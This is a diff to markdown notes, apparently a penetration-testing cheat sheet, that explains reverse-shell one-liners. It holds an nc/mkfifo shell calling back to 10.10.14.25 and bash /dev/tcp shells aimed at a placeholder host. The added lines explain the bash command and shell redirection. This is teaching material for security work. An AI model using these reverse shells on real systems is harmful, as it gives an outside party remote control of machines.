@@ -71,8 +71,25 @@ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9999 >/tmp/f
 ```sh
 bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
 ```
-- if there is no nc nor bash
+- If commands are running in something like sh
 ```sh
-
 bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
+#this command starts a bash shell, then redirects stdout+stderr to the dest_ip:dest_port, then redirects the stdout into bash as input.
 ```
+# Footnotes:
+##  file descriptor numbers
+    - 0：Standard Input (STDIN)，預設為鍵盤輸入值
+    - 1：Standard Output (STDOUT)，預設為終端機螢幕顯示輸出
+    - 2：Standard Error (STDERR)，預設為終端機螢幕顯示輸出
+## &>name
+redirect stdout and stderr to the file name 
+## <
+A less-than sign (<) represents input redirection. On the other hand, a greater than sign (>) is used for the output redirection. “<” and “>” are also called angled brackets.
+For example:
+```bash
+some_commnand < some_file
+```
+## Difference between “>” and “>>” in Linux
+    - “>” overwrites an already existing file or a new file is created providing the mentioned file name isn’t there in the directory. 
+    - “>>” operator appends an already present file or creates a new file if that file name doesn’t exist in the directory. 
+## How to enable /dev/tcp in bash?
